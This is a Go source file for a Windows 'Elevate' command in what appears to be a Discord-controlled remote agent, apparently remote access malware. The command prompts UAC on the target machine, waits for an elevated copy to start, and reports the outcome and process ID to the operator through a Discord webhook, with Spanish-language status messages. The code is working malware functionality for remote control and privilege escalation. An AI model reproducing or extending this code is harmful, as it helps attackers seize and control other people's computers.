//go:build windows

package commands

import (
	"fmt"
	"os"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
	"github.com/local/govoid/internal/win32"
)

func Elevate(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	if win32.IsAdmin() {
		Finish(s, i, "✅ El agente ya corre con privilegios de administrador.\n```\ntoken    : elevado\nHKLM     : escribible\nSystem32 : escribible\nservicio : instalable\n```")
		return
	}

	win32.ClearElevationMarker()

	if err := win32.RequestElevation(); err != nil {
		Finish(s, i, "❌ No se pudo lanzar el UAC.\n```\n"+err.Error()+"\n```\nHace falta alguien en la máquina para aceptar el aviso.")
		return
	}

	Finish(s, i, "🛡️ UAC lanzado en la máquina.\n```\nsi se acepta : el agente vuelve con token completo\nsi se cancela: este proceso sigue vivo y sin cambios\nplazo        : 45 s\n```")

	go func() {
		pid, ok := win32.WaitElevationMarker(45 * time.Second)
		if !ok {
			_ = util.PostWebhook("⚠️ Elevación no aceptada", 15158332, webhookFields(
				util.EmbedField{Name: "motivo", Value: "UAC cancelado o sin respuesta", Inline: true},
				util.EmbedField{Name: "estado", Value: "el agente sigue sin privilegios", Inline: true},
			))
			return
		}

		_ = util.PostWebhook("🛡️ Agente elevado", 3066993, webhookFields(
			util.EmbedField{Name: "pid", Value: fmt.Sprintf("%d", pid), Inline: true},
			util.EmbedField{Name: "nota", Value: "el proceso anterior se retira", Inline: true},
		))

		time.Sleep(1500 * time.Millisecond)
		os.Exit(0)
	}()
}
